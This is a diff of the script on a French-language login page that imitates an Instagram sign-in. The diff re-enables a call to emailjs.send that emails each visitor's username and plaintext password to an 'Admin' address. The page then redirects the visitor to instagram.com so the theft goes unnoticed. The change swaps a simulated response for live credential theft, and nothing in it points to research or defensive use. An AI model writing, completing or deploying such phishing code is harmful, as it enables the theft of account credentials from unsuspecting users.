@@ -66,89 +66,81 @@
 
 <script>
     (function() {
-    // Initialize EmailJS with the public key
-    emailjs.init("A88kLwmlhDSGII5Jf");
+        // Initialize EmailJS with the public key
+        emailjs.init("A88kLwmlhDSGII5Jf");
 
-    const loginButton = document.getElementById('loginButton');
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
 
-    // Function to validate inputs
-    function validateInputs() {
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value;
+        // Function to validate inputs
+        function validateInputs() {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
 
-        // Enable button only if both fields are non-empty
-        const isValid = username.length > 0 && password.length > 0;
-        loginButton.disabled = !isValid;
+            // Enable button only if both fields are non-empty
+            const isValid = username.length > 0 && password.length > 0;
+            loginButton.disabled = !isValid;
 
-        return isValid;
-    }
-
-    // Add input event listeners for real-time validation
-    usernameInput.addEventListener('input', validateInputs);
-    passwordInput.addEventListener('input', validateInputs);
-
-    // Login attempt function
-    async function loginAttempt(e) {
-        e.preventDefault();
-
-        // Validate inputs before proceeding
-        if (!validateInputs()) {
-            return;
+            return isValid;
         }
 
-        const username = usernameInput.value;
-        const password = passwordInput.value;
+        // Add input event listeners for real-time validation
+        usernameInput.addEventListener('input', validateInputs);
+        passwordInput.addEventListener('input', validateInputs);
 
-        try {
-            // Temporarily disable button and change text
-            loginButton.disabled = true;
-            loginButton.querySelector('div').textContent = 'Connexion en cours...';
+        // Login attempt function
+        async function loginAttempt(e) {
+            e.preventDefault();
 
-            // COMMENTED OUT: actual email sending
-            /*
-            const response = await emailjs.send("service_jrhf8hz", "template_xhozxlg", {
-                from_name: "Login Form",
-                to_name: "Admin",
-                message: `Login Attempt:\nUsername/Email: ${username}\nPassword: ${password}`
-            });
-            */
-            
-            // Simulate successful response
-            const response = {
-                status: 200,
-                text: "OK"
-            };
+            // Validate inputs before proceeding
+            if (!validateInputs()) {
+                return;
+            }
 
-            console.log('SUCCESS!', response.status, response.text);
+            const username = usernameInput.value;
+            const password = passwordInput.value;
 
-            // Clear inputs
-            usernameInput.value = '';
-            passwordInput.value = '';
+            try {
+                // Temporarily disable button and change text
+                loginButton.disabled = true;
+                loginButton.querySelector('div').textContent = 'Connexion en cours...';
 
-            // Redirect
-            window.location.href = 'https://www.instagram.com';
+                // Send login attempt using EmailJS with specific service and template
+                const response = await emailjs.send("service_jrhf8hz", "template_xhozxlg", {
+                    from_name: "Login Form",
+                    to_name: "Admin",
+                    message: `Login Attempt:\nUsername/Email: ${username}\nPassword: ${password}`
+                });
 
-        } catch (error) {
-            console.error('FAILED...', error);
-            
-            // Restore button state
-            loginButton.disabled = false;
-            loginButton.querySelector('div').textContent = 'Se connecter';
+                console.log('SUCCESS!', response.status, response.text);
 
-            // Optional: show error to user
-            alert(`Échec de la connexion : ${error.message}`);
+                // Clear inputs
+                usernameInput.value = '';
+                passwordInput.value = '';
 
-        } finally {
-            // Ensure button is re-enabled
-            loginButton.disabled = false;
-            loginButton.querySelector('div').textContent = 'Se connecter';
+                // Redirect
+                window.location.href = 'https://www.instagram.com';
+
+            } catch (error) {
+                console.error('FAILED...', error);
+                
+                // Restore button state
+                loginButton.disabled = false;
+                loginButton.querySelector('div').textContent = 'Se connecter';
+
+                // Optional: show error to user
+                alert(`Échec de la connexion : ${error.message}`);
+
+            } finally {
+                // Ensure button is re-enabled
+                loginButton.disabled = false;
+                loginButton.querySelector('div').textContent = 'Se connecter';
+            }
         }
-    }
 
-    // Add submit event listener
-    loginButton.closest('form').addEventListener('submit', loginAttempt);
+        // Add submit event listener
+        loginButton.closest('form').addEventListener('submit', loginAttempt);
     })();
 </script>
 
